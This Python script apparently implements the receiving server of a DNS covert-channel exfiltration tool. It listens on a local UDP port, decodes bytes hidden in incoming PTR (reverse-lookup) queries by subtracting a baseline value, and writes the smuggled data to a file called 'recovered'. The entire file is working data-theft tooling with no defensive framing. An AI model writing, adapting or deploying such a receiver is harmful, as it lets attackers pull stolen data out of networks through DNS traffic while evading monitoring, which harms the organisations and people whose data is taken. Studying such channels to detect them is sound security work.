import re
import random
import socket
from dns import resolver, reversename, message, query

server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
server_socket.bind(('127.0.0.1', 49250))
recovered = ""

def find_payload(hex_message,is_baseline=False):
    if is_baseline:
        hm_slice = hex_message[hex_message.find("10000010000000000000")+len("10000010000000000000")+1:hex_message.find("03313732")]
    else:
        hm_slice = hex_message[hex_message.find("10000010000000000000")+len("10000010000000000000")+1:hex_message.find("313034")]
    hm_slice_split = re.split('01|02|03', hm_slice)
    new_baseline = []
    new_baseline.insert(0,hm_slice_split[0][1])
    for y in range(1,len(hm_slice_split)):
        full_decimal = ""
        for x in range(0,len(hm_slice_split[y]),2):
            full_decimal+=hm_slice_split[y][x+1]
        if full_decimal == "0":
            full_decimal = "00"
        else:
            if len(full_decimal)==1:
                full_decimal = "0"+full_decimal
        new_baseline.insert(0,full_decimal)
    new_baseline = "".join(new_baseline)
    return new_baseline

old_stream_id = "0000"
while True:
    data, address = server_socket.recvfrom(1024)
    data = data.upper()
    hex_message = data.hex()
    query = message.from_wire(data)
    response = message.make_response(query)
    if "00000c0001" in hex_message:
        if "313732" in hex_message:
            new_baseline = find_payload(hex_message,is_baseline=True)
            print(f"[!] NEW BASELINE: {new_baseline}")
        else:
            stream_id = hex_message[0:4]
            if stream_id != old_stream_id:
                payload = find_payload(hex_message)
                if payload == "06072":
                    print("[!] Full data received. Exiting")
                    break
                else:
                    recovered_byte = int(payload) - int(new_baseline)
                    hex_recovered_byte = str(hex(recovered_byte)).split("0x")[1]
                    if len(hex_recovered_byte)==1:
                        hex_recovered_byte = "0"+hex_recovered_byte

                    print(f"[*] ADDING HEX BYTE: {hex_recovered_byte}")
                    recovered += hex_recovered_byte

                    with open("recovered","wb") as f:
                        f.write(bytes.fromhex(recovered))
                    
                    old_stream_id = stream_id
        server_socket.sendto(response.to_wire(), address)